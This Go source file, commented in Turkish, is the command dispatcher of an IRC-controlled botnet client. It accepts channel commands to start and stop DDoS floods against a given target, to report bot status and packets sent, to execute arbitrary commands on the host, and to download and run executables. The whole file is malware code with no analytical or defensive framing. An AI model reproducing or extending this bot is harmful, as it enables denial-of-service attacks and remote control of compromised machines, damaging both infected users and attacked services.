package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/thoj/go-ircevent"
)

//Status IRC'ye BOT'un durumunu yazar
func Status(ircConnection *irc.Connection) {
	ircname, err := os.Hostname()
	if err != nil {
		ircname = "Bilinmiyor"
	}
	var msg = fmt.Sprintf("DDoS Çalışma Durumu: %t | Yollanılan Paket Sayısı: %d | Isim: %s | Version: %s", ddosStatus, getReqSent, ircname, VERSION)
	ircConnection.Privmsg(string(channel), string(msg))
}

//CommandParser IRC'den gelen komutları ayırır
func CommandParser(message string, ircConnection *irc.Connection) {
	command := strings.Split(message, " ")[0]
	arguments := []string{}
	if len(strings.Split(message, " ")) > 1 {
		arguments = strings.Split(message, " ")[1:]
	}
	switch strings.ToUpper(command) {
	case "!DDOS_START":
		if len(arguments) > 1 && arguments != nil {
			threadNum, err := strconv.Atoi(arguments[1])
			if err == nil {
				DDOSStart(arguments[0], threadNum, ircConnection)
			}
		}
		break
	case "!DDOS_STOP":
		if ddosStatus == true {
			DDOSStop(ircConnection)
		}
		break
	case "!STATUS":
		Status(ircConnection)
		break

	case "!EXEC":
		if len(arguments) >= 2 {
			ExecCommand(strings.Join(arguments[1:]," "),arguments[0], ircConnection)
		}
		break

	case "!DOWNLOAD_EXE":
		if len(arguments) >= 3 {
			DownloadEXE(arguments[2], arguments[1], arguments[0], ircConnection)
		}
		break
	}
}
